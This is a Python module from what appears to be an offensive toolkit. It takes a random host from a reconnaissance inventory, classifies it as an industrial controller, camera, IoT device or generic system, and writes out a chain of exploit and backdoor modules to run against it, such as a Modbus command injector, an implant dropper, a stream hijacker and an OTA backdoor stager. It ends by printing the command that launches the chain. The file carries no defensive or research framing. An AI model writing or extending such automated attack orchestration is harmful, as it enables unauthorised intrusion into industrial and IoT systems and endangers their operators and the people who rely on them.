# modules/orchestration/chain_autopilot.py

import json
import os
from datetime import datetime
import random

INVENTORY_PATH = "recon/agent_inventory.json"
MODULE_DB_PATH = "config/module_db.json"
AUTO_CHAIN_OUT = "results/auto_chain_config.json"

def classify_target(target):
    if "modbus" in target.get("services", []):
        return "plc"
    if "rtsp" in target.get("services", []):
        return "camera"
    if "mqtt" in target.get("services", []):
        return "iot"
    return "generic"

def build_chain(target_type):
    chains = {
        "plc": [
            {"module": "modules/exploits/modbus_command_injector.py", "args": "--target-ip {ip}"},
            {"module": "modules/payloads/implant_dropper.py", "args": "--target {ip}"}
        ],
        "camera": [
            {"module": "modules/exploits/rtsp_stream_hijacker.py", "args": "--target {ip}"},
            {"module": "modules/exploits/webcam_stream_hijacker.py", "args": "--target {ip}"}
        ],
        "iot": [
            {"module": "modules/exploits/mqtt_payload_detonator.py", "args": "--broker {ip} --topic /redot --payload reboot"},
            {"module": "modules/payloads/ota_backdoor_stager.py", "args": "--target {ip}"}
        ],
        "generic": [
            {"module": "modules/exploits/ssrf_blaster.py", "args": "--target {ip}"},
            {"module": "modules/payloads/upload_poisoner.py", "args": "--target {ip}"}
        ]
    }
    return chains.get(target_type, chains["generic"])

def autopilot():
    if not os.path.exists(INVENTORY_PATH):
        print("[!] No recon inventory found.")
        return

    with open(INVENTORY_PATH, "r") as f:
        inventory = json.load(f)

    if not inventory:
        print("[!] Inventory empty.")
        return

    target = random.choice(inventory)
    ip = target.get("ip")
    target_type = classify_target(target)

    print(f"[✓] Selected {ip} as target ({target_type})")

    chain = build_chain(target_type)
    for step in chain:
        step["args"] = step["args"].format(ip=ip)

    with open(AUTO_CHAIN_OUT, "w") as f:
        json.dump(chain, f, indent=2)

    print(f"[✓] Generated chain: {AUTO_CHAIN_OUT}")
    print("→ Run with: python3 modules/orchestration/offensive_chainer.py --config results/auto_chain_config.json")

if __name__ == "__main__":
    autopilot()
